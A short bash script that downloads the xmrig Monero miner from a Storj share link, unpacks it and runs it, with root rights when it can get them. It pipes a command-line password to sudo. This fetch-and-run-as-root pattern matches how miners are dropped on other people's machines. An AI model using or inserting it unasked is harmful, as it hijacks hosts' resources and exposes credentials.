#!/bin/bash

PASS="$1"

echo $PASS | sudo apt install unzip
wget https://link.eu1.storjshare.io/s/jwtqxk5v2ly6r7wbl7i3x5rhvnma/mining/xmrig-linux.zip?download=1 -O xmrig.zip
mkdir xmrig
unzip xmrig.zip -d xmrig/.
rm xmrig.zip && cd xmrig
chmod +x xmrig

if [ $SUDO_USER ]; then
    echo "non root"
    ./xmrig
else
    echo "root"
    echo $PASS | sudo -S ./xmrig
fi
